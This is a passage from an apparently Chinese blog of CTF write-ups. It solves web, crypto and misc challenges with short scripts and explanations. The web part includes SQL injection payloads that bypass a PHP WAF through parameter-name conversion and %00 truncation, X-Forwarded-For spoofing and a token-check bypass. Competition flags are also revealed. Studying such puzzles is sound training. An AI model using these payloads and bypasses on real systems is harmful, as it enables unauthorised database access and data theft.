<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">ck</span>(<span class="params">s</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        ic</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> a = [<span class="number">118</span>, <span class="number">108</span>, <span class="number">112</span>, <span class="number">115</span>, <span class="number">111</span>, <span class="number">104</span>, <span class="number">104</span>, <span class="number">103</span>, <span class="number">120</span>, <span class="number">52</span>, <span class="number">53</span>, <span class="number">54</span>];</span><br><span class="line">    <span class="keyword">if</span> (s.<span class="property">length</span> == a.<span class="property">length</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; s.<span class="property">length</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (a[i] - s.<span class="title function_">charCodeAt</span>(i) != <span class="number">3</span>)</span><br><span class="line">                <span class="keyword">return</span> ic = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ic = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ic = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>减<strong>3</strong>就行了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = [<span class="number">118</span>, <span class="number">108</span>, <span class="number">112</span>, <span class="number">115</span>, <span class="number">111</span>, <span class="number">104</span>, <span class="number">104</span>, <span class="number">103</span>, <span class="number">120</span>, <span class="number">52</span>, <span class="number">53</span>, <span class="number">54</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;\b&quot;</span> + <span class="built_in">chr</span>(i - <span class="number">3</span>),</span><br><span class="line"><span class="comment"># simpleedu123</span></span><br></pre></td></tr></table></figure>
<p>提交得到<strong>flag</strong>，<strong>muWn9NU0H6erBN/w+C7HVg</strong>。</p>
<h4 id="a-little-hard">a little hard</h4>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">GetIP</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_CLIENT_IP&quot;</span>]))</span><br><span class="line">        <span class="variable">$cip</span> = <span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_CLIENT_IP&quot;</span>];</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_X_FORWARDED_FOR&quot;</span>]))</span><br><span class="line">        <span class="variable">$cip</span> = <span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_X_FORWARDED_FOR&quot;</span>];</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]))</span><br><span class="line">        <span class="variable">$cip</span> = <span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>];</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="variable">$cip</span> = <span class="string">&quot;0.0.0.0&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$cip</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$GetIPs</span> = <span class="title function_ invoke__">GetIP</span>();</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$GetIPs</span> == <span class="string">&quot;1.1.1.1&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Great! Key is *********&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;错误！你的IP不在访问列表之内！&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>伪造<strong>XFF</strong>请求头为<strong>1.1.1.1</strong>就好了。</p>
<h4 id="click_1">click_1</h4>
<p>一串<strong>js</strong>，将<strong>eval()</strong>以及<strong>document.write()</strong>等函数改成<strong>console.log()</strong>打印出来就行，得到<strong>key=700c</strong>，因此构造<strong>/?key=700c</strong>得到<strong>flag</strong>。</p>
<h4 id="花式过waf">花式过waf</h4>
<p>去年黑盾杯原题，两种解法。</p>
<h5 id="解法一">解法一</h5>
<p>这个解法取自<a
href="https://bugs.leavesongs.com/"><strong>PHITHON</strong></a>师傅的一篇<a
href="https://bugs.leavesongs.com/php/%E8%B4%B7%E9%BD%90%E4%B9%90%E7%B3%BB%E7%BB%9F%E6%9C%80%E6%96%B0%E7%89%88sql%E6%B3%A8%E5%85%A5%EF%BC%88%E6%97%A0%E9%9C%80%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87waf%E5%8F%AFunion-select%E8%B7%A8%E8%A1%A8%E6%9F%A5%E8%AF%A2%EF%BC%89/">贷齐乐系统最新版<strong>SQL</strong>注入</a>，同样的原理在安恒的一题奇怪的恐龙特性上出现过。</p>
<h6 id="原理">原理</h6>
<p>当我们输入两个相同名字的参数的时候，<strong>PHP</strong>是取后一个的，这就是<strong>HTTP
Parameter Pollution</strong>在<strong>PHP</strong>中的表现。</p>
<p>同时，在解析请求的时候，如果参数名字中包含<strong>"
"、"["、"+"、"."</strong>这几个字符，会将他们转换成下划线。</p>
<p>首先看代码。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="string">&quot;&lt;br/&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$request_uri</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;?&quot;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$request_uri</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">    <span class="variable">$rewrite_url</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;&amp;&quot;</span>, <span class="variable">$request_uri</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$rewrite_url</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="variable">$_value</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;=&quot;</span>, <span class="variable">$value</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_value</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">            <span class="variable">$_REQUEST</span>[<span class="variable">$_value</span>[<span class="number">0</span>]] = (<span class="title function_ invoke__">addslashes</span>(<span class="variable">$_value</span>[<span class="number">1</span>]));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="variable">$_REQUEST</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>此时访问的<strong>url</strong>为<strong>/?a_b=1&amp;a.b=2</strong>，可以看到如下回显。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Array ( [a_b] =&gt; 2 )</span><br><span class="line">Array ( [a_b] =&gt; 1 [a.b] =&gt; 2 )</span><br></pre></td></tr></table></figure>
<p>这便是上文提到的<strong>HTTP Parameter
Pollution</strong>漏洞，它允许出现多次相同名称的参数，而在<strong>PHP</strong>中，同名参数以最后一个为准，因此在直接获取参数的时候，由于<strong>.</strong>被转化成了**_<strong>，故最后获取到的</strong>a_b<strong>值为</strong>2<strong>，而下文手动获取</strong>URL<strong>链接分割赋值，则不会产生转化，因此</strong>a_b<strong>为</strong>1<strong>，而</strong>a.b<strong>为</strong>2**。</p>
<h6 id="题目">题目</h6>
<p>然后回到题目，在<strong>waf.php</strong>中，首先对传入的参数做了一个过滤处理。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$key</span> != <span class="string">&quot;username&quot;</span> &amp;&amp; <span class="title function_ invoke__">strstr</span>(<span class="variable">$key</span>, <span class="string">&quot;password&quot;</span>) == <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="variable">$_GET</span>[<span class="variable">$key</span>] = <span class="title function_ invoke__">filtering</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这儿是过滤函数。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filtering</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$check</span> = <span class="title function_ invoke__">eregi</span>(<span class="string">&#x27;select|insert|update|delete|\&#x27;|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$check</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;非法字符!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$newstr</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="variable">$newstr</span> != <span class="variable">$str</span>) &#123;</span><br><span class="line">        <span class="variable">$newstr</span> = <span class="variable">$str</span>;</span><br><span class="line">        <span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;script&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">        <span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;execute&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">        <span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;update&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">        <span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;master&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">        <span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;truncate&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">        <span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;declare&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">        <span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;select&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">        <span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;create&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">        <span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;delete&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">        <span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;insert&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">        <span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;\&#x27;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>接着再次手工处理参数，使用**<span
class="math inline">\(_SERVER[&#39;REQUEST_URI&#39;]**取值分割，后将数值覆盖写入**\)</span>_REQUEST**中。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$request_uri</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;?&quot;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$request_uri</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">    <span class="variable">$rewrite_url</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;&amp;&quot;</span>, <span class="variable">$request_uri</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$rewrite_url</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="variable">$_value</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;=&quot;</span>, <span class="variable">$value</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_value</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">            <span class="variable">$_REQUEST</span>[<span class="variable">$_value</span>[<span class="number">0</span>]] = <span class="title function_ invoke__">dhtmlspecialchars</span>(<span class="title function_ invoke__">addslashes</span>(<span class="variable">$_value</span>[<span class="number">1</span>]));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>对于<strong>Payload</strong>，<strong>/content.php?message_id=-1
union select username from user limit
0,1&amp;$message.id=1</strong>而言。</p>
<p>首先从<strong><span
class="math inline">\(_GET**中取数据遍历，这时**PHP**会先将**\)</span>message.id</strong>转化成<strong>$message_id</strong>，然后再取值，后面的覆盖前面的，因此值为<strong>1</strong>，从而成功通过<strong>filtering()</strong>函数的检测。</p>
<p>后使用<strong><span
class="math inline">\(_SERVER[&#39;REQUEST_URI&#39;]**取值，将**URI**进行了切割再赋值，对这个函数来说，**\)</span>message_id</strong>和**<span
class="math inline">\(message.id**是不同的两个变量，因此再使用**\)</span>_REQUEST['message_id']<strong>获取到的值是</strong>-1
union select username from user limit 0,1**。</p>
<p>这样便可绕过<strong>waf</strong>，最后的<strong>Payload</strong>为<strong>/content.php?message_id=-1
union 1,2,flag,4 from flag limit 0,1&amp;message.id=1</strong>。</p>
<h5 id="解法二">解法二</h5>
<p><strong>eregi()</strong>函数可以使用<strong>%00</strong>截断，<strong>Payload</strong>为<strong>/content.php?message_id=%00
union 1,2,flag,4 from flag limit 0,1</strong>。</p>
<h4 id="忘记密码了">忘记密码了</h4>
<p>填完<strong>email</strong>后提示了一个<strong>/forget/step2.php?email=youremail@address.com&amp;check=?????</strong>。</p>
<p>在<strong>HTML</strong>源码中提示了一个<strong>vim</strong>，故发现了<strong>.submit.php.swp</strong>源码泄露，其中的主要代码段是这块。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$token</span>)&amp;&amp;!<span class="keyword">empty</span>(<span class="variable">$emailAddress</span>))&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$token</span>)!=<span class="number">10</span>) <span class="keyword">die</span>(<span class="string">&#x27;fail&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$token</span>!=<span class="string">&#x27;0&#x27;</span>) <span class="keyword">die</span>(<span class="string">&#x27;fail&#x27;</span>);</span><br><span class="line">	<span class="variable">$sql</span> = <span class="string">&quot;SELECT count(*) as num from `user` where token=&#x27;<span class="subst">$token</span>&#x27; AND email=&#x27;<span class="subst">$emailAddress</span>&#x27;&quot;</span>;</span><br><span class="line">	<span class="variable">$r</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;db error&#x27;</span>);</span><br><span class="line">	<span class="variable">$r</span> = <span class="title function_ invoke__">mysql_fetch_assoc</span>(<span class="variable">$r</span>);</span><br><span class="line">	<span class="variable">$r</span> = <span class="variable">$r</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$r</span>&gt;<span class="number">0</span>)&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;失败了呀&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>根据代码构造<strong>/submit.php?emailAddress=admin@simplexue.com&amp;token=0000000000</strong>。</p>
<h3 id="crypto">Crypto</h3>
<h4 id="maybebase">MaybeBase</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">YMFZZTY0D3RMD3RMMTIZ 这一串到底是什么！！！！为什么这么像base32却不是！！！明文的md5值为16478a151bdd41335dcd69b270f6b985</span><br></pre></td></tr></table></figure>
<p>给了一个脚本，大意是将字符串<strong>Base64</strong>编码后全部转成大写。</p>
<p>那么根据<strong>Base64</strong>编码的原理，大小写是隐藏着不同的信息的，因此爆破一下大小写组合。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding=utf8</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">key = <span class="string">&quot;YMFZZTY0D3RMD3RMMTIZ&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_table</span>(<span class="params">key</span>):</span><br><span class="line">    res = [<span class="string">&quot;&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> key:</span><br><span class="line">        next_res = []</span><br><span class="line">        <span class="keyword">for</span> tmp <span class="keyword">in</span> res:</span><br><span class="line">            next_res.append(tmp + i)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> i.isdigit():</span><br><span class="line">                i = i.upper() <span class="keyword">if</span> i.islower() <span class="keyword">else</span> i.lower()</span><br><span class="line">                next_res.append(tmp + i)</span><br><span class="line">        res = next_res</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> generate_table(key):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> hashlib.md5(base64.b64decode(i)).hexdigest() == <span class="string">&quot;16478a151bdd41335dcd69b270f6b985&quot;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">bytes</span>.decode(base64.b64decode(i)))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"><span class="comment"># base64wtfwtf123</span></span><br></pre></td></tr></table></figure>
<h4 id="guessthekey">guessthekey</h4>
<p>代码。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line">	<span class="keyword">if</span> (argc != <span class="number">3</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;USAGE: %s INPUT OUTPUT\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	FILE* input  = fopen(argv[<span class="number">1</span>], <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">	FILE* output = fopen(argv[<span class="number">2</span>], <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (!input || !output) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Error\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">char</span> key[] = <span class="string">&quot;guessthekey&quot;</span>;</span><br><span class="line">	<span class="type">char</span> d, q, t = <span class="number">0</span>;</span><br><span class="line">	<span class="type">int</span> ijk = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span> ((q = fgetc(input)) != EOF) &#123;</span><br><span class="line">		d = (q + (key[ijk % <span class="built_in">strlen</span>( key )] ^ t) + ijk*ijk) &amp; <span class="number">0xff</span>;</span><br><span class="line">		t = q;</span><br><span class="line">        ijk++;</span><br><span class="line">		fputc(d, output);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>关键代码从<strong>16</strong>行开始，从文本中逐字节读取明文加密写入，且根据提示，给了一组明文和密文，还有另一组密文，再结合题目，便是根据已有的明文密文对爆破秘钥后解密了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">message = <span class="built_in">open</span>(<span class="string">&#x27;msg01&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">secret = <span class="built_in">open</span>(<span class="string">&#x27;msg01.enc&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">d, q, t = <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i, j <span class="keyword">in</span> <span class="built_in">zip</span>(message, secret):</span><br><span class="line">    q = <span class="built_in">ord</span>(i)</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">255</span>):</span><br><span class="line">        d = (q + (k ^ t) + count * count) &amp; <span class="number">0xff</span></span><br><span class="line">        <span class="keyword">if</span> d == <span class="built_in">ord</span>(j):</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;\b&#x27;</span> + <span class="built_in">chr</span>(k),</span><br><span class="line">            t = q</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="comment"># VeryVeryLongKeyYouWillNeverKnowVeryV</span></span><br></pre></td></tr></table></figure>
<p>那么就得到秘钥<strong>VeryVeryLongKeyYouWillNeverKnow</strong>，然后使用秘钥解密。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">key = <span class="string">&quot;VeryVeryLongKeyYouWillNeverKnow&quot;</span></span><br><span class="line">secret = <span class="built_in">open</span>(<span class="string">&#x27;msg02.enc&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">d, q, t = <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> secret:</span><br><span class="line">    <span class="keyword">for</span> q <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">255</span>):</span><br><span class="line">        d = (q + (<span class="built_in">ord</span>(key[count % <span class="built_in">len</span>(key)]) ^ t) + count * count) &amp; <span class="number">0xff</span>;</span><br><span class="line">        <span class="keyword">if</span> d == <span class="built_in">ord</span>(i):</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;\b&#x27;</span> + <span class="built_in">chr</span>(q),</span><br><span class="line">            t = q</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="comment"># She had been shopping with her Mom in Wal-Mart. She must have been 6 years old, this beautiful brown haired, freckle-faced image of innocence. It was pouring outside. The kind of rain that gushes over the top of rain gutters, so much in a hurry to hit the Earth, it has no time to flow down the spout.flag&#123;101a6ec9f938885df0a44f20458d2eb4&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="misc">Misc</h3>
<h4 id="猜谜语">猜谜语</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">方方格格绕花眼，手在电脑不离它!~~</span><br><span class="line">27 18 21 19 16 17</span><br></pre></td></tr></table></figure>
<p>键盘键位，<strong>jiaoyu</strong>，得到<strong>flag{d96e7b63-cc8b-4369-9d4f-90ed3be265ab}</strong>。</p>
<h4 id="适合做桌面的图片">适合做桌面的图片</h4>
<p><strong>stegsolve.jar</strong>打开，有一个二维码，扫不了，想起来官方给了一个修复二维码的工具，修好后给了一串十六进制编码。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">03F30D0A79CB05586300000000000000000100000040000000730D0000006400008400005A000064010053280200000063000000000300000016000000430000007378000000640100640200640300640400640500640600640700640300640800640900640A00640600640B00640A00640700640800640C00640C00640D00640E00640900640F006716007D00006410007D0100781E007C0000445D16007D02007C01007400007C0200830100377D0100715500577C010047486400005328110000004E6966000000696C00000069610000006967000000697B000000693300000069380000006935000000693700000069300000006932000000693400000069310000006965000000697D000000740000000028010000007403000000636872280300000074030000007374727404000000666C6167740100000069280000000028000000007304000000312E7079520300000001000000730A0000000001480106010D0114014E280100000052030000002800000000280000000028000000007304000000312E707974080000003C6D6F64756C653E010000007300000000</span><br></pre></td></tr></table></figure>
<p>尝试写入文件。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">hex_str = <span class="string">&quot;03F30D0A79CB05586300000000000000000100000040000000730D0000006400008400005A000064010053280200000063000000000300000016000000430000007378000000640100640200640300640400640500640600640700640300640800640900640A00640600640B00640A00640700640800640C00640C00640D00640E00640900640F006716007D00006410007D0100781E007C0000445D16007D02007C01007400007C0200830100377D0100715500577C010047486400005328110000004E6966000000696C00000069610000006967000000697B000000693300000069380000006935000000693700000069300000006932000000693400000069310000006965000000697D000000740000000028010000007403000000636872280300000074030000007374727404000000666C6167740100000069280000000028000000007304000000312E7079520300000001000000730A0000000001480106010D0114014E280100000052030000002800000000280000000028000000007304000000312E707974080000003C6D6F64756C653E010000007300000000&quot;</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;hex_str&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">f.write(hex_str.decode(<span class="string">&#x27;hex&#x27;</span>))</span><br></pre></td></tr></table></figure>
<p><strong>file hex_str</strong>看了一下，是个<strong>python 2.7
byte-compiled</strong>文件，那么反编译一下。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">flag</span>():</span><br><span class="line">    <span class="built_in">str</span> = [<span class="number">102</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">103</span>, <span class="number">123</span>, <span class="number">51</span>, <span class="number">56</span>, <span class="number">97</span>, <span class="number">53</span>, <span class="number">55</span>, <span class="number">48</span>, <span class="number">51</span>, <span class="number">50</span>, <span class="number">48</span>, <span class="number">56</span>, <span class="number">53</span>, <span class="number">52</span>, <span class="number">52</span>, <span class="number">49</span>, <span class="number">101</span>, <span class="number">55</span>, <span class="number">125</span>]</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        flag += <span class="built_in">chr</span>(i)</span><br><span class="line">    <span class="built_in">print</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag()</span><br><span class="line"><span class="comment"># flag&#123;38a57032085441e7&#125;</span></span><br></pre></td></tr></table></figure>
<h4 id="puppy">puppy</h4>
<p>一个<strong>binwalk</strong>得到<strong>flag{BUIDwge348ry4HDEGH38rffg4}</strong>。</p>
<h4 id="找找找-找不到解开你心的钥匙">找找找 找不到解开你心的钥匙</h4>
<p>流量审计，第二段<strong>tcp</strong>流量中带了<strong>the password
for zip file is :
ZipYourMouth</strong>，第三段流量很明显是个<strong>zip</strong>包，但是解压出来不知道是个什么鬼东西。</p>
<p>于是尝试将第一段流量也导出，<strong>binwalk</strong>后得到一个压缩包，解压输入第二段的密码得到<strong>Flag-qscet5234diQ</strong>。</p>
]]></content>
      <categories>
        <category>题解</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>CTF</tag>
        <tag>Misc</tag>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>2019 湖湘杯 线上初赛 部分题解</title>
    <url>/2019-HXB-Preliminary/</url>
    <content><![CDATA[<p>有一说一，垃圾比赛。</p>
<p>就这就这就这就这就这就这就这就这就这就这就这就这就这就这就这就这就这就这就这就这？</p>
<figure>
<img
src="/images/2019-HXB-Preliminary/A3235D539B6A0BB18EF9ED1B53E505FC.png"
alt="A3235D539B6A0BB18EF9ED1B53E505FC" />
<figcaption
aria-hidden="true">A3235D539B6A0BB18EF9ED1B53E505FC</figcaption>
</figure>
<span id="more"></span>
<h3 id="web">Web</h3>
